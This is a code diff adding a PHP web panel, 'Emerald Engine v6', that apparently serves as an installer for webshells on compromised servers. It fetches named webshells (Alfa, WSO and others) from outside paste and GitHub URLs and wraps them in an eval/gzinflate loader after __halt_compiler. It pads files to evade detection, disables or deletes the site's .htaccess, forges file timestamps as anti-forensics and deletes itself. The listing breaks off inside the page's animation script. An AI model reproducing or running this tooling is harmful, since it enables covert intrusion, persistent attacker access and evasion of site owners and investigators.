@@ -1,0 +1,839 @@
+<?php
+session_start();
+
+/*
+ * EMERALD ENGINE v6.0 - SECURE & ADVANCED EDITION (WIDE UI + PARTICLES)
+ * Core Logic: Unchanged (100% Safe & Functional)
+ * New Features: 
+ * 1. .htaccess Installer Toggle (Default: OFF)
+ * 2. Time-Stomp (Anti-Forensic / Fake Date)
+ * 3. Self-Destruct (Delete Installer after success)
+ * 4. Secure Login Access (Bcrypt Hash)
+ * 5. Interactive Tab UI & Enhanced Select Bar
+ * 6. Raw Panel Editor (Direct Script Generation)
+ * 7. Wide Dashboard Layout (2 Columns)
+ * 8. HTML5 Canvas Flying Fire Particles (Lightweight & Smooth)
+ * 9. About Modal Dialog
+ */
+
+// --- AUTHENTICATION SYSTEM ---
+$password_hash = '$2y$10$BsCu/twmOyImyVdp2T0sQOERQmqhARiHn8rdtLhQP7PqsR3s3Ues.';
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+$login_error = "";
+if (isset($_POST['auth_password'])) {
+    if (password_verify($_POST['auth_password'], $password_hash)) {
+        $_SESSION['emerald_logged_in'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $login_error = "Authentication Failed. Access Denied.";
+    }
+}
+
+$is_logged_in = isset($_SESSION['emerald_logged_in']) && $_SESSION['emerald_logged_in'] === true;
+
+// --- BUILDER VARIABLES ---
+$msg = "";
+$msg_class = "";
+
+// --- PRESET TEMPLATES ---
+$templates = [
+    "" => "-- Select Module Template --",
+    "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/ptsmc" => "Template 1: PTSMC Shell",
+    "https://hushh.pro/a1/webshell/alfasc.txt" => "Template 2: Alfa Shell",
+    "https://hushh.pro/a1/webshell/gelay.txt" => "Template 3: Gelay Shell",
+    "https://okepaste.cc/r/19c86cf0" => "Template 4: Waras Shell",
+    "https://okepaste.cc/r/79e072b0" => "Template 5: Super Shell",
+    "https://okepaste.cc/r/eb04dde9" => "Template 6: PTSMC (CN Version) Shell",
+    "https://okepaste.cc/r/3045c618" => "Template 7: Clay Shell",
+    "https://hushh.pro/a1/webshell/selda1.txt" => "Template 8: Selda Shell",
+    "https://okepaste.cc/r/c43810d9" => "Template 9: FM Shell",
+    "https://okepaste.cc/r/f1c4f901" => "Template 10: WSO Shell",
+    "https://okepaste.cc/r/0c185e84" => "Template 11: Bypass-(White Shell)",
+    "https://okepaste.cc/r/36c6cfb7" => "Template 12: Skobam",
+    "https://okepaste.cc/r/6f3fca90" => "Template 13: Gecko (Bypass)",
+    "https://okepaste.cc/r/c7c7d772" => "Template 14: Evolution",
+    "https://okepaste.cc/r/09405460" => "Template 15: Litespeed",
+    "https://okepaste.cc/r/9c734c02" => "Template 12: Alfabypass"
+];
+
+// --- DOWNLOADER FUNCTION ---
+function getSource($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $res = curl_exec($ch);
+        curl_close($ch);
+        if($res) return $res;
+    }
+    return @file_get_contents($url);
+}
+
+// --- BUILDER LOGIC (ONLY IF LOGGED IN) ---
+if ($is_logged_in && isset($_POST['build'])) {
+    
+    // Core Inputs
+    $input_mode = isset($_POST['input_mode']) ? $_POST['input_mode'] : 'url';
+    $url        = trim($_POST['url'] ?? '');
+    $raw_code   = $_POST['raw_code'] ?? '';
+    $dir_input  = rtrim(trim($_POST['dir_path']), '/\\'); 
+    $file_input = trim($_POST['filename']);
+    $path       = $dir_input . DIRECTORY_SEPARATOR . $file_input;
+    $pad_kb     = intval($_POST['padding']); 
+    
+    // Feature Toggles
+    $bypass     = isset($_POST['bypass_htaccess']) ? true : false;
+    $install_ht = isset($_POST['install_htaccess']) ? true : false;
+    $timestomp  = isset($_POST['timestomp']) ? true : false;
+    $suicide    = isset($_POST['self_destruct']) ? true : false;
+
+    if ($dir_input && $file_input) {
+        
+        $code = "";
+        
+        // --- INPUT MODE LOGIC ---
+        if ($input_mode === 'editor') {
+            $code = $raw_code;
+            if (empty($code)) {
+                $msg = "Editor cannot be empty. Please input your raw script.";
+                $msg_class = "error";
+            }
+        } else {
+            if ($url) {
+                $code = getSource($url);
+                if (empty($code)) {
+                    $msg = "Download failed. Check URL or Server Connection.";
+                    $msg_class = "error";
+                }
+            } else {
+                $msg = "Template or Custom URL missing.";
+                $msg_class = "error";
+            }
+        }
+
+        // --- EXECUTE BUILD IF CODE ACQUIRED ---
+        if (!empty($code) && empty($msg)) {
+            
+            if (!is_dir($dir_input)) { @mkdir($dir_input, 0755, true); }
+
+            $htaccess_path = $dir_input . DIRECTORY_SEPARATOR . ".htaccess";
+            $htaccess_bak  = $dir_input . DIRECTORY_SEPARATOR . ".htaccess.bak";
+            $status_log = "";
+
+            // 1. FIREWALL BYPASS LOGIC
+            if ($bypass && file_exists($htaccess_path)) {
+                if (@rename($htaccess_path, $htaccess_bak)) {
+                    $status_log .= "<div class='log-item success'>[✔] Firewall/Htaccess Disabled</div>";
+                } else {
+                    @chmod($htaccess_path, 0666);
+                    @unlink($htaccess_path); 
+                }
+            }
+
+            // 2. ENCODE & COMPRESS PAYLOAD
+            $payload = gzdeflate($code, 9);
+            if ($pad_kb > 0) {
+                $payload .= str_repeat("\0", $pad_kb * 1024);
+            }
+            $loader = '<?php
+$h = fopen(__FILE__, "rb");
+fseek($h, __COMPILER_HALT_OFFSET__);
+eval("?>".gzinflate(stream_get_contents($h)));
+__halt_compiler();';
+            $final = $loader . $payload;
+
+            // 3. WRITE TO TARGET
+            if (@file_put_contents($path, $final)) {
+                $size = number_format(filesize($path)/1024, 2);
+                
+                // 4. OPTIONAL: INSTALL HTACCESS (Only if toggled ON)
+                if($install_ht) {
+                    $ht_source = "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/Ht-Access";
+                    $ht_code = getSource($ht_source);
+                    if($ht_code) {
+                        if(@file_put_contents($htaccess_path, $ht_code)){
+                            @chmod($htaccess_path, 0444);
+                            $status_log .= "<div class='log-item success'>[✔] Auto-Shield .htaccess Installed (0444)</div>";
+                        }
+                    }
+                }
+
+                // 5. OPTIONAL: TIME STOMP (Anti-Forensic)
+                if($timestomp) {
+                    $past_time = time() - (365 * 24 * 60 * 60 * 2); // 2 Years ago
+                    @touch($path, $past_time);
+                    $status_log .= "<div class='log-item warning'>[✔] Timestamp Forged (2 Years Ago)</div>";
+                }
+
+                $doc_root = $_SERVER['DOCUMENT_ROOT'];
+                $web_link = str_replace($doc_root, "", $path);
+                $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
+                $full_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $web_link;
+                $display_loc = basename($path);
+
+                // 6. OPTIONAL: SELF DESTRUCT
+                $suicide_msg = "";
+                if($suicide) {
+                    $suicide_msg = "<div class='log-item danger'>[⚠] Installer Deleted (Self-Destruct Executed)</div>";
+                    // Delete THIS file
+                    @unlink(__FILE__);
+                }
+
+                $msg = "<h5>SYSTEM STATUS: SUCCESS</h5>
+                        <div class='info-grid'>
+                            <span>Target:</span> <code>$display_loc</code>
+                            <span>Size:</span> <code>$size KB (Stealth)</code>
+                        </div>
+                        
+                        <div class='status-logs'>
+                            $status_log
+                            $suicide_msg
+                        </div>
+
+                        <div class='action-buttons'>
+                            <a href='$web_link' target='_blank' class='btn-action btn-open'>[ OPEN FILE ]</a>
+                            <button type='button' onclick=\"copyLink('$full_url')\" class='btn-action btn-copy'>[ COPY LINK ]</button>
+                        </div>";
+                $msg_class = "success";
+            } else {
+                $msg = "Write failed! Permission Denied.<br>Enable 'Force Mode' switch.";
+                $msg_class = "error";
+            }
+        }
+    } else {
+        $msg = "Directory and Filename input missing.";
+        $msg_class = "error";
+    }
+}
+
+$current_dir = getcwd();
+$default_file = "File.php";
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emerald Engine v6 | Advanced</title>
+    <style>
+        /* --- CONFIG VARIABLES --- */
+        :root {
+            --bg-dark: #030000;
+            --panel-glass: rgba(12, 8, 8, 0.75);
+            --input-bg: rgba(5, 2, 2, 0.6);
+            --accent-red: #ff1a1a;
+            --accent-dark: #990000;
+            --accent-glow: rgba(255, 26, 26, 0.5);
+            --success: #10b981;
+            --success-glow: rgba(16, 185, 129, 0.6);
+            --warning: #f59e0b;
+            --text-main: #e2e8f0;
+            --text-muted: #94a3b8;
+            --error: #ef4444;
+        }
+
+        /* --- SMOOTH ANIMATIONS --- */
+        @keyframes fadeInUp { 
+            from { opacity: 0; transform: translateY(20px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
+        
+        @keyframes pulseBorder {
+            0% { border-color: rgba(255, 26, 26, 0.3); box-shadow: 0 0 10px rgba(255, 26, 26, 0.1); }
+            50% { border-color: rgba(255, 26, 26, 0.8); box-shadow: 0 0 20px rgba(255, 26, 26, 0.3); }
+            100% { border-color: rgba(255, 26, 26, 0.3); box-shadow: 0 0 10px rgba(255, 26, 26, 0.1); }
+        }
+
+        /* --- GLOBAL & BODY --- */
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            color: var(--accent-red);
+            margin: 0; padding: 40px 20px;
+            min-height: 100vh;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            background-color: var(--bg-dark);
+            position: relative; overflow-x: hidden; overflow-y: auto;
+            box-sizing: border-box;
+        }
+        
+        /* --- FIRE PARTICLE CANVAS --- */
+        #fireCanvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            z-index: -3; /* Di belakang semuanya */
+            pointer-events: none; /* Biar ngga ganggu klik */
+            background: radial-gradient(circle at center, #1a0000 0%, #030000 80%);
+        }
+
+        /* --- CONTAINER WIDE LAYOUT --- */
+        .container {
+            background: var(--panel-glass);
+            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+            width: 100%; 
+            max-width: 950px; /* DIBUAT LEBIH LEBAR */
+            padding: 3.5rem;
+            border-radius: 35px;
+            border: 1px solid rgba(255, 26, 26, 0.15);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.95), inset 0 0 20px rgba(255, 0, 0, 0.05);
+            margin: auto;
+            position: relative;
+            animation: fadeInUp 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
+        }
+
+        .container-login {
+            max-width: 420px;
+            text-align: center;
+            padding: 3rem 2rem;
+        }
+
+        /* --- HEADER --- */
+        .header { text-align: center; margin-bottom: 2.5rem; position: relative;}
+        .header h1 { 
+            margin: 0; font-size: 3rem; font-weight: 900; 
+            background: linear-gradient(135deg, #ff3333, #ff1a1a, #660000);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            text-shadow: 0 10px 30px rgba(255, 0, 0, 0.4); letter-spacing: -1.5px;
+        }
+        .header span { 
+            display: block; margin-top: 10px; font-size: 0.9rem; color: #fff; 
+            opacity: 0.6; letter-spacing: 5px; font-weight: 700; text-transform: uppercase;
+        }
+
+        /* --- TOP ACTION BUTTONS (ABOUT & LOGOUT) --- */
+        .top-nav {
+            position: absolute; top: 30px; width: calc(100% - 60px);
+            display: flex; justify-content: space-between;
+            padding: 0 30px; box-sizing: border-box;
+            left: 0; right: 0;
+        }
+        .nav-btn {
+            color: var(--text-muted); text-decoration: none; font-size: 0.75rem; font-weight: 800; 
+            border: 1px solid rgba(255,255,255,0.08); padding: 8px 18px; border-radius: 12px; 
+            transition: all 0.3s ease; letter-spacing: 1.5px; background: rgba(0,0,0,0.4);
+            cursor: pointer; text-transform: uppercase;
+        }
+        .nav-btn:hover {
+            color: #fff; border-color: var(--accent-red); background: rgba(255,26,26,0.15);
+            box-shadow: 0 0 20px rgba(255,26,26,0.4); transform: translateY(-2px);
+        }
+
+        /* --- ABOUT MODAL (NEW) --- */
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); z-index: 100;
+            justify-content: center; align-items: center; opacity: 0; transition: opacity 0.4s ease;
+        }
+        .modal-overlay.active { display: flex; opacity: 1; }
+        .modal-content {
+            background: linear-gradient(145deg, rgba(20,10,10,0.95), rgba(5,0,0,0.95));
+            border: 1px solid rgba(255,26,26,0.3); border-radius: 25px;
+            padding: 3rem; max-width: 500px; width: 90%; text-align: center;
+            box-shadow: 0 20px 60px rgba(255,26,26,0.2);
+            transform: translateY(30px); transition: transform 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
+            position: relative;
+        }
+        .modal-overlay.active .modal-content { transform: translateY(0); }
+        .modal-content h2 { color: #fff; margin-top: 0; font-size: 2rem; letter-spacing: -1px; text-shadow: 0 0 15px var(--accent-glow);}
+        .modal-content p { color: #bbb; line-height: 1.7; font-size: 0.95rem; margin-bottom: 2rem;}
+        .close-modal {
+            background: var(--accent-red); color: #fff; border: none; padding: 12px 30px;
+            border-radius: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase;
+            transition: 0.3s; letter-spacing: 2px;
+        }
+        .close-modal:hover { background: #fff; color: var(--accent-red); box-shadow: 0 0 20px rgba(255,255,255,0.5); }
+
+        /* --- GRID FORM LAYOUT (WIDE UI) --- */
+        .form-grid-layout {
+            display: grid;
+            grid-template-columns: 1fr 1fr; /* 2 Kolom untuk melebar */
+            gap: 2.5rem;
+            align-items: start;
+        }
+
+        /* --- TABS --- */
+        .mode-tabs {
+            display: flex; gap: 10px; margin-bottom: 1.5rem;
+            background: rgba(0,0,0,0.4); padding: 6px; border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .tab-btn {
+            flex: 1; padding: 14px; background: transparent; border: none;
+            color: var(--text-muted); font-size: 0.85rem; font-weight: bold; text-transform: uppercase;
+            border-radius: 15px; cursor: pointer; transition: all 0.3s; letter-spacing: 1px;
+        }
+        .tab-btn:hover { color: #fff; background: rgba(255, 255, 255, 0.05); }
+        .tab-btn.active { 
+            background: linear-gradient(90deg, rgba(255,26,26,0.2), rgba(153,0,0,0.1)); 
+            color: #fff; border: 1px solid rgba(255,26,26,0.3);
+            box-shadow: 0 0 15px rgba(255,26,26,0.15); 
+        }
+
+        /* --- FORM ELEMENTS & UPGRADED SELECT --- */
+        .form-group { animation: fadeInUp 0.5s ease forwards; opacity: 0; margin-bottom: 1.5rem;}
+        .left-col .form-group:nth-child(1) { animation-delay: 0.1s; }
+        .right-col .form-group:nth-child(1) { animation-delay: 0.2s; }
+        .right-col .form-group:nth-child(2) { animation-delay: 0.3s; }
+        
+        label { 
+            display: block; margin-bottom: 0.8rem; font-size: 0.75rem; 
+            font-weight: 800; color: #ddd; text-transform: uppercase; letter-spacing: 1.5px;
+        }
+        
+        input[type="text"], input[type="password"], textarea {
+            width: 100%; padding: 18px; background-color: var(--input-bg);
+            border: 1px solid rgba(255,255,255,0.08); border-radius: 18px; color: #fff;
+            font-family: monospace; font-size: 0.95rem; box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+        
+        /* THE NEW DYNAMIC SELECT BOX */
+        select {
+            width: 100%; padding: 18px 45px 18px 18px;
+            background-color: var(--input-bg);
+            color: #fff; font-family: monospace; font-size: 0.95rem;
+            border: 1px solid rgba(255,255,255,0.08); border-radius: 18px;
+            box-sizing: border-box; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer; appearance: none; -webkit-appearance: none; -moz-appearance: none;
+            /* Ikon Panah SVG Kustom yang lebih smooth */
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23ff1a1a' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat; background-position: right 1.2rem center; background-size: 1.2rem;
+        }
+
+        select option {
+            background-color: #0d0808; color: #fff; padding: 15px; font-weight: bold;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none; background: rgba(20, 5, 5, 0.8);
+            animation: pulseBorder 2s infinite; /* Animasi Glow Fokus */
+            transform: translateY(-2px);
+        }
+        
+        select:hover {
+            border-color: rgba(255,26,26,0.4);
+            background-color: rgba(30, 5, 5, 0.7);
+        }
+
+        textarea#raw-editor {
+            height: 240px; resize: vertical; color: var(--success);
+            line-height: 1.6; font-size: 0.85rem; background: #080505;
+        }
+
+        #custom-url-group, #editor-group { display: none; }
+        #custom-url-group { margin-top: 1rem; }
+
+        /* --- ADVANCED TOGGLE GRID --- */
+        .toggle-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 15px;
+            animation: fadeInUp 0.5s ease forwards 0.4s; opacity: 0;
+        }
+
+        .toggle-card {
+            display: flex; align-items: center; justify-content: space-between;
+            background: rgba(255, 255, 255, 0.02); padding: 14px 18px;
+            border-radius: 18px; border: 1px solid rgba(255, 255, 255, 0.03);
+            transition: 0.3s;
+        }
+        .toggle-card:hover { border-color: rgba(255, 26, 26, 0.4); background: rgba(255, 0, 0, 0.04); transform: translateY(-2px); }
+        
+        .toggle-text { font-size: 0.8rem; color: #fff; font-weight: 700; letter-spacing: 0.5px;}
+        .toggle-sub { display: block; font-size: 0.65rem; color: #888; margin-top: 3px; font-weight: bold; text-transform: uppercase;}
+
+        .switch { position: relative; display: inline-block; width: 48px; height: 26px; flex-shrink: 0; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider {
+            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(255,255,255,0.08); border-radius: 30px; transition: .4s;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .slider:before {
+            position: absolute; content: ""; height: 16px; width: 16px; left: 4px; bottom: 4px;
+            background-color: #aaa; border-radius: 50%; transition: .4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+        input:checked + .slider { background-color: var(--success); border-color: var(--success); box-shadow: 0 0 15px var(--success-glow); }
+        input:checked + .slider:before { transform: translateX(22px); background-color: white; }
+
+        /* Responsive Breakpoint for Grid */
+        @media (max-width: 850px) { 
+            .form-grid-layout { grid-template-columns: 1fr; gap: 1rem;} 
+            .container { padding: 2rem; max-width: 100%; }
+            .top-nav { position: relative; top: 0; padding: 0; margin-bottom: 20px; width: 100%;}
+        }
+        @media (max-width: 500px) {
+            .toggle-grid { grid-template-columns: 1fr; }
+        }
+
+        /* --- BUTTONS --- */
+        .btn-submit {
+            width: 100%; padding: 20px; margin-top: 2rem;
+            background: linear-gradient(90deg, #ff1a1a, #b30000, #ff1a1a);
+            background-size: 200% auto; color: white; border: none; border-radius: 22px;
+            font-weight: 900; font-size: 1.1rem; cursor: pointer; text-transform: uppercase; letter-spacing: 3px;
+            transition: 0.5s; animation: fadeInUp 0.5s ease forwards 0.5s; opacity: 0;
+            box-shadow: 0 10px 25px rgba(255, 26, 26, 0.25);
+        }
+        .btn-submit:hover { 
+            background-position: right center; 
+            box-shadow: 0 15px 35px rgba(255, 26, 26, 0.5); transform: translateY(-3px); 
+        }
+
+        /* --- RESULT BOX --- */
+        .alert {
+            background: rgba(10, 5, 5, 0.8); padding: 1.8rem; border-radius: 25px;
+            border-left: 5px solid #ff0000; margin-bottom: 2rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); animation: fadeInUp 0.5s ease;
+        }
+        .alert.error { border-left-color: var(--error); color: #fff; }
+        .alert h5 { margin: 0 0 15px 0; color: var(--success); letter-spacing: 2px; font-size: 1.1rem;}
+        
+        .info-grid {
+            display: grid; grid-template-columns: min-content 1fr; gap: 8px 15px;
+            font-size: 0.95rem; margin-bottom: 15px; color: #eee;
+        }
+        .info-grid span { color: var(--text-muted); font-weight: bold; }
+        .info-grid code { color: var(--success); font-family: monospace; background: rgba(16,185,129,0.1); padding: 4px 8px; border-radius: 6px; }
+        
+        .status-logs { margin-top: 15px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; text-align: left; }
+        .log-item { font-size: 0.85rem; margin-bottom: 6px; font-family: monospace; padding: 8px 12px; border-radius: 10px; background: rgba(0,0,0,0.4); }
+        .log-item.success { color: var(--success); border-left: 3px solid var(--success); }
+        .log-item.warning { color: var(--warning); border-left: 3px solid var(--warning); }
+        .log-item.danger { color: var(--error); font-weight: bold; border-left: 3px solid var(--error); }
+
+        .action-buttons { display: flex; gap: 15px; margin-top: 20px; }
+        .btn-action {
+            flex: 1; padding: 16px; border-radius: 16px; font-weight: 800; font-size: 0.85rem;
+            text-align: center; text-decoration: none; border: 1px solid transparent; cursor: pointer; text-transform: uppercase;
+            transition: all 0.3s; letter-spacing: 1px;
+        }
+        .btn-open { background: rgba(255, 26, 26, 0.1); color: var(--accent-red); border-color: rgba(255, 26, 26, 0.2); }
+        .btn-open:hover { background: var(--accent-red); color: #fff; box-shadow: 0 0 25px rgba(255, 26, 26, 0.5); transform: translateY(-2px); }
+        .btn-copy { background: transparent; border-color: rgba(255,255,255,0.15); color: #ccc; }
+        .btn-copy:hover { border-color: #fff; color: #fff; transform: translateY(-2px); }
+        
+    </style>
+</head>
+<body>
+
+    <canvas id="fireCanvas"></canvas>
+
+    <div class="modal-overlay" id="aboutModal">
+        <div class="modal-content">
+            <h2>EMERALD ENGINE v6</h2>
+            <p>
+                Advanced Payload Installer crafted for stealth, speed, and reliability. 
+                Equipped with Time-Stomp anti-forensics, Auto-Shielding, and Self-Destruct protocols to ensure maximum security during deployments.
+                <br><br>
+                <strong style="color:var(--accent-red); font-size: 1.1rem;">Developed by PTSMC Group</strong>
+            </p>
+            <button class="close-modal" onclick="closeAbout()">Acknowledge</button>
+        </div>
+    </div>
+
+    <?php if (!$is_logged_in): ?>
+        <div class="container container-login">
+            <div class="header" style="margin-bottom: 2rem;">
+                <h1 style="font-size: 2.2rem;">Emerald Shield</h1>
+                <span>Encrypted Access Area</span>
+            </div>
+
+            <?php if ($login_error): ?>
+                <div class="alert error" style="padding: 1.2rem; text-align: center; margin-bottom: 1.5rem; font-size: 0.9rem;">
+                    <?php echo $login_error; ?>
+                </div>
+            <?php endif; ?>
+
+            <form method="POST">
+                <div class="form-group" style="animation-delay: 0.1s;">
+                    <input type="password" name="auth_password" placeholder="Enter Engine Password..." required style="text-align: center; font-size: 1.1rem; letter-spacing: 2px;">
+                </div>
+                <button type="submit" class="btn-submit" style="animation-delay: 0.2s; margin-top: 0.5rem;">Authenticate</button>
+            </form>
+        </div>
+    <?php else: ?>
+        <div class="container">
+            
+            <div class="top-nav">
+                <button class="nav-btn" onclick="openAbout()">About</button>
+                <a href="?logout=true" class="nav-btn">Logout</a>
+            </div>
+            
+            <div class="header">
+                <h1>Emerald Engine</h1>
+                <span>Created By PTSMC Group</span>
+            </div>
+
+            <?php if($msg): ?>
+                <div class="alert <?php echo $msg_class; ?>">
+                    <?php echo $msg; ?>
+                </div>
+            <?php endif; ?>
+
+            <form method="POST">
+                <input type="hidden" name="input_mode" id="input_mode" value="url">
+
+                <div class="form-grid-layout">
+                    <div class="left-col">
+                        <div class="form-group">
+                            <div class="mode-tabs">
+                                <button type="button" class="tab-btn active" id="btn-tab-url" onclick="switchMode('url')">Template Link</button>
+                                <button type="button" class="tab-btn" id="btn-tab-editor" onclick="switchMode('editor')">Raw Editor</button>
+                            </div>
+
+                            <div id="url-group-wrapper">
+                                <label>Target Payload</label>
+                                <select id="template-select" onchange="updateUrl()">
+                                    <?php foreach($templates as $link => $name): ?>
+                                        <option value="<?php echo $link; ?>"><?php echo $name; ?></option>
+                                    <?php endforeach; ?>
+                                    <option value="custom">-- Custom Raw URL --</option>
+                                </select>
+                                <div id="custom-url-group">
+                                    <input type="text" name="url" id="url-input" placeholder="Paste RAW Shell URL here...">
+                                </div>
+                            </div>
+
+                            <div id="editor-group">
+                                <label>Code Workspace</label>
+                                <textarea name="raw_code" id="raw-editor" placeholder="Paste or type your raw PHP script here...&#10;It will be directly encoded and generated."></textarea>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Installation Directory Path</label>
+                            <input type="text" name="dir_path" value="<?php echo $current_dir; ?>" required>
+                        </div>
+                    </div>
+
+                    <div class="right-col">
+                        <div class="form-group">
+                            <label>Output Filename</label>
+                            <input type="text" name="filename" value="<?php echo $default_file; ?>" placeholder="login.php" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Stealth Padding Size</label>
+                            <select name="padding">
+                                <option value="0">None (Smallest Size)</option>
+                                <option value="400" selected>Add 400 KB (Recommended)</option>
+                                <option value="1000">Add 1 MB (Heavy Detection Bypass)</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label style="margin-bottom: 15px;">Advanced Modules</label>
+                            <div class="toggle-grid">
+                                <div class="toggle-card">
+                                    <div>
+                                        <span class="toggle-text">Force Mode</span>
+                                        <span class="toggle-sub">Kill Existing .htaccess</span>
+                                    </div>
+                                    <label class="switch">
+                                        <input type="checkbox" name="bypass_htaccess">
+                                        <span class="slider"></span>
+                                    </label>
+                                </div>
+
+                                <div class="toggle-card">
+                                    <div>
+                                        <span class="toggle-text">Auto Shield</span>
+                                        <span class="toggle-sub">Install Secure .htaccess</span>
+                                    </div>
+                                    <label class="switch">
+                                        <input type="checkbox" name="install_htaccess">
+                                        <span class="slider"></span>
+                                    </label>
+                                </div>
+
+                                <div class="toggle-card">
+                                    <div>
+                                        <span class="toggle-text">Time Stomp</span>
+                                        <span class="toggle-sub">Fake Date (2y ago)</span>
+                                    </div>
+                                    <label class="switch">
+                                        <input type="checkbox" name="timestomp">
+                                        <span class="slider"></span>
+                                    </label>
+                                </div>
+
+                                <div class="toggle-card">
+                                    <div>
+                                        <span class="toggle-text" style="color:#fca5a5;">Self Destruct</span>
+                                        <span class="toggle-sub">Delete After Install</span>
+                                    </div>
+                                    <label class="switch">
+                                        <input type="checkbox" name="self_destruct">
+                                        <span class="slider"></span>
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div> <button type="submit" name="build" class="btn-submit">Execute Installation</button>
+            </form>
+        </div>
+
+        <script>
+            // --- TAB SWITCH LOGIC ---
+            function switchMode(mode) {
+                document.getElementById('input_mode').value = mode;
+                
+                var btnUrl = document.getElementById('btn-tab-url');
+                var btnEditor = document.getElementById('btn-tab-editor');
+                var groupUrl = document.getElementById('url-group-wrapper');
+                var groupEditor = document.getElementById('editor-group');
+
+                if (mode === 'editor') {
+                    btnEditor.classList.add('active');
+                    btnUrl.classList.remove('active');
+                    groupEditor.style.display = 'block';
+                    groupUrl.style.display = 'none';
+                    setTimeout(() => document.getElementById('raw-editor').focus(), 100);
+                } else {
+                    btnUrl.classList.add('active');
+                    btnEditor.classList.remove('active');
+                    groupUrl.style.display = 'block';
+                    groupEditor.style.display = 'none';
+                }
+            }
+
+            // --- URL/TEMPLATE SELECT LOGIC ---
+            function updateUrl() {
+                var select = document.getElementById('template-select');
+                var customGroup = document.getElementById('custom-url-group');
+                var input = document.getElementById('url-input');
+
+                if (select.value === 'custom') {
+                    customGroup.style.display = 'block';
+                    input.value = '';
+                    setTimeout(() => input.focus(), 100); 
+                } else {
+                    customGroup.style.display = 'none';
+                    input.value = select.value;
+                }
+            }
+            
+            // --- COPY LOGIC ---
+            function copyLink(text) {
+                navigator.clipboard.writeText(text).then(function() {
+                    var btn = document.querySelector('.btn-copy');
+                    var originalText = btn.innerHTML;
+                    btn.innerHTML = "COPIED!";
+                    btn.style.color = "#10b981";
+                    btn.style.borderColor = "#10b981";
+                    btn.style.background = "rgba(16, 185, 129, 0.1)";
+                    setTimeout(function() {
+                        btn.innerHTML = "[ COPY LINK ]";
+                        btn.style.color = "";
+                        btn.style.borderColor = "";
+                        btn.style.background = "";
+                    }, 2000);
+                });
+            }
+
+            // --- ABOUT MODAL LOGIC ---
+            function openAbout() {
+                document.getElementById('aboutModal').classList.add('active');
+            }
+            function closeAbout() {
+                document.getElementById('aboutModal').classList.remove('active');
+            }
+            
+            // Initialization
+            updateUrl();
+        </script>
+    <?php endif; ?>
+
+    <script>
+        const canvas = document.getElementById('fireCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        let width, height;
+        let particles = [];
+        
+        // Setup Canvas Size
+        function resize() {
+            width = window.innerWidth;
+            height = window.innerHeight;
+            canvas.width = width;
+            canvas.height = height;
+        }
+        window.addEventListener('resize', resize);
+        resize();
+
+        // Particle Class
+        class FireParticle {
+            constructor() {
+                this.reset();
+                this.y = Math.random() * height; // Initial random spawn
+            }
+            
+            reset() {
+                this.x = Math.random() * width;
+                this.y = height + Math.random() * 100; // Spawn below screen
+                this.size = Math.random() * 3 + 1;
+                this.speedY = -(Math.random() * 2 + 0.5); // Move up
+                this.speedX = (Math.random() - 0.5) * 1; // Sway left/right
+                this.life = Math.random() * 0.5 + 0.5; // Opacity
+                this.decay = Math.random() * 0.005 + 0.002;
+                
+                // Color variations (Red, Orange, dark red)
+                const colors = ['#ff1a1a', '#ff4d4d', '#990000', '#ff8000'];
+                this.color = colors[Math.floor(Math.random() * colors.length)];
+            }
+            
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                this.life -= this.decay;
+                
+                // Gentle sway
+                this.speedX += (Math.random() - 0.5) * 0.1;
+                
+                if (this.life <= 0 || this.y < -10) {
+                    this.reset();
+                }
+            }
+            
+            draw() {
